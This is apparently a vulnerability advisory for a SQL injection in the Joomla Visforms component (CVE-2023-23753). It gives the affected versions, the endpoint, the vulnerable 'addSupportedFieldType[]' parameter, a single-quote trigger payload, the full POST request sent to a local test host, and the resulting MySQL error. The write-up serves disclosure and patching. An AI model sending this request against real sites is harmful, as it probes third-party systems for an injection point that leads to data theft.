# SQL Injection Vulnerability - Joomla Visforms Component

## Vulnerability Summary
- **Component**: Joomla Visforms
- **Vulnerability Type**: SQL Injection
- **Parameter**: `addSupportedFieldType[]`
- **Method**: POST
- **Severity**: Critical

## Affected Installs
- com_visforms versions 3.8.0 - 3.14.10.
- Visforms Base Package 3.0.0 - 3.0.4 (Since version 3.14.6 com_visforms is part of the Visforms Base Package)

## Target Information
- **Endpoint**: `/index.php?task=visforms.send&id=1`
- **Application**: Joomla CMS with Visforms extension

## Vulnerability Details

### Affected Parameter
The vulnerability exists in the `addSupportedFieldType[]` parameter, which appears to be improperly sanitized before being used in a SQL query.

### Payload Used
```
addSupportedFieldType[]=pagebreak'
```

### Request Details
```http
POST /index.php?task=visforms.send&id=1 HTTP/1.1
Host: 127.0.0.1:8081
Content-Type: application/x-www-form-urlencoded
Content-Length: 178

form1name=test&form1vorname=test&postid=1&addSupportedFieldType%5B%5D=pagebreak'&return=aHR0cDovLzEyNy4wLjAuMTo4MDgxLw%2C%2C&86943d7016f8b77ef63479de53175204=1&form1senden=Senden
```

### SQL Error Response
The application returned a MySQL syntax error, confirming the SQL injection vulnerability:

```
Error: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''pagebreak''')
ORDER BY `ordering` asc' at line 3
```

## Technical Analysis

### Error Breakdown
- **Error Code**: 1064 (MySQL syntax error)
- **Injection Point**: The single quote `'` in the payload causes the SQL query to break
- **Query Fragment**: The error reveals part of the SQL structure with `ORDER BY \`ordering\` asc`
- **Response**: HTTP 500 Internal Server Error with detailed MySQL error message

## Proof of Concept Steps
1. Navigate to the Joomla site with Visforms component
2. Submit a form with the malicious payload in the `addSupportedFieldType[]` parameter
3. Observe the SQL error response confirming the injection

## URLs
- https://nvd.nist.gov/vuln/detail/CVE-2023-23753
- https://vi-solutions.de/en/announcements/867-security-announcement-cve-2023-23754
